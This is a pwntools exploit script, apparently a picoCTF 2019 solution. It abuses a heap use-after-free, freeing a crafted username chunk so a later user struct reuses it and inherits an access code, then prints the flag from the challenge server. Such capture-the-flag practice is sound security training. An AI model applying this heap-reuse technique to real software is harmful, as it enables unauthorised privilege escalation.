from pwn import *


# Constants
ACCESS_CODE_1 = '524f4f545f414343'
ACCESS_CODE_2 = '4553535f434f4445'

context.log_level = 'debug'
# p = process('./auth')
p = remote('2019shell1.picoctf.com', 49920)


def login(name):
    p.sendline(b'login')

    p.recvline() #  "Please enter the length of your username"
    name_length = str(31).encode('utf-8')
    p.sendline(name_length)

    p.recvline() # "Please enter your username"
    p.sendline(name)


def logout():
    p.sendline(b'logout')


def print_flag():
    p.sendline(b'print-flag')
    p.recvall()


def get_menu():
    p.recvline() #  "Commands:"
    p.recvline() #  "\tlogin - login as a user"
    p.recvline() #  "\tprint-flag - print the flag"
    p.recvline() #  "\tlogout - log out"
    p.recvline() #  "\tquit - exit the program"



get_menu()

p.recvline() #  "\nEnter your command:"
p.recvline() #  [get_username]>
# Allocate 2 * 32 byte fastbin chunk. One for username and one for struct user. Later on we will want to allocate malicious user in place of username, so that a new user will have access_code filled
access_code = b'A' * 8 + bytes.fromhex(ACCESS_CODE_1) + bytes.fromhex(ACCESS_CODE_2)
login(access_code)


p.recvline() #  "\nEnter your command:"
p.recvline() #  [get_username]>
# Mark the above allocated memory as free
logout()


p.recvline() #  "\nEnter your command:"
p.recvline() #  [get_username]>
# Allocate again 2*32 byte fastbin chunk, so that memory for struct user now points to previously allocated username, meaning the new struct user instance has access_code filled.
name = 20 * b'B'
login(name)


p.recvline() #  "\nEnter your command:"
p.recvline() #  [get_username]>
# Mark the above allocated memory as free
print_flag()